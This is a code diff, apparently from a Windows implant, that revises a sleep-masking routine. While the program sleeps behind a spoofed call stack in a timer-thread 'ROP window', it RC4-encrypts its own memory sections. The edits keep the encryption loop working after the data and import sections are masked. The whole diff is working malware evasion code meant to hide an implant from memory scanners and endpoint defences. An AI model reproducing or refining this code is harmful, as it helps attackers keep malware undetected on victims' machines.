@@ -63,7 +63,7 @@ static G3_SF032 g_sf032;
  * plaintext, so one routine serves as both encrypt and decrypt. Each block
  * derives its own key (16B key XOR'd with the block counter) so two blocks
  * never share a keystream. */
-static void g3_rc4(unsigned char * buf, unsigned long len, const unsigned char key[16], unsigned int ctr)
+static void g3_rc4(G3_SF032 fn, unsigned char * buf, unsigned long len, const unsigned char key[16], unsigned int ctr)
 {
 	unsigned char k[16];
 	G3_USTRING d, kk;
@@ -77,7 +77,7 @@ static void g3_rc4(unsigned char * buf, unsigned long len, const unsigned char k
 	d.Buffer = buf;
 	d.Length = d.MaximumLength = len;
 
-	g_sf032(&d, &kk);
+	fn(&d, &kk);
 	memset(k, 0, 16);
 }
 
@@ -451,12 +451,11 @@ static BOOL g3_stack_spoof_sleep(DWORD time, G3_MASKFN maskfn, void * ctx)
 	                            WT_EXECUTEINTIMERTHREAD))
 		goto done;
 
+	/* from here until the wait returns: no API, no static data reads -
+	 * the IAT (.rdata) and .data are ciphertext for this whole span */
 	maskfn(ctx);
-
-	g3_log("sleep: mask done, waiting", 0x7fffffff);
 	pwait(event, INFINITE);
 	ok = TRUE;
-	g3_log("sleep: ROP window served", 0x7fffffff);
 
 done:
 	if (queue != NULL)
@@ -477,9 +476,23 @@ typedef struct {
 static void g3_mask_all_cb(void * vctx)
 {
 	G3_MASKCTX * m = (G3_MASKCTX *)vctx;
-	int i;
-	for (i = 0; i < m->nblocks; i++)
-		g3_rc4(m->blocks[i].ptr, m->blocks[i].len, m->key, (unsigned int)i);
+	/* g_sf032 lives in .data - once a masked block covers .data the static
+	 * would read back as ciphertext and the next call jumps to garbage.
+	 * Everything the loop touches must be stack/frame-local from here on. */
+	G3_SF032 fn = g_sf032;
+	G3_BLOCK blk;
+	unsigned char key[16];
+	int i, n;
+
+	memcpy(key, m->key, 16);
+	n = m->nblocks;
+	/* blocks[] is the caller's stack array - frame-escape safe: the caller
+	 * (gen3_sleep) is blocked in its own wait below us on the same stack */
+	for (i = 0; i < n; i++) {
+		blk.ptr = m->blocks[i].ptr;
+		blk.len = m->blocks[i].len;
+		g3_rc4(fn, blk.ptr, blk.len, key, (unsigned int)i);
+	}
 }
 
 BOOL gen3_sleep(DWORD time)
@@ -520,10 +533,14 @@ BOOL gen3_sleep(DWORD time)
 		g3_log("sleep: window failed -> fallback", 0x7fffffff);
 		return FALSE;
 	}
+	g3_log("sleep: ROP window served", 0x7fffffff);
 
 	/* RC4 twice with the same key restores the plaintext */
-	for (i = 0; i < nblocks; i++)
-		g3_rc4(blocks[i].ptr, blocks[i].len, key, (unsigned int)i);
+	{
+		G3_SF032 fn = g_sf032;
+		for (i = 0; i < nblocks; i++)
+			g3_rc4(fn, blocks[i].ptr, blocks[i].len, key, (unsigned int)i);
+	}
 	g3_log("sleep: unmasked", 0x7fffffff);
 
 	memset(key, 0, sizeof(key));
